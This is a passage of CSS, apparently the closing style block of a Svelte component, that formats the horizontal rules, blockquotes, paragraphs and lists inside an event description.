		background: transparent;
		padding: 0;
	}
	:global(.event-description hr) {
		border: 0;
		border-top: 1px solid currentColor;
		opacity: 0.25;
		margin: 1rem 0;
	}
	:global(.event-description blockquote p:last-child),
	:global(.event-description p:last-child),
	:global(.event-description ul:last-child),
	:global(.event-description ol:last-child) {
		margin-bottom: 0;
	}
</style>
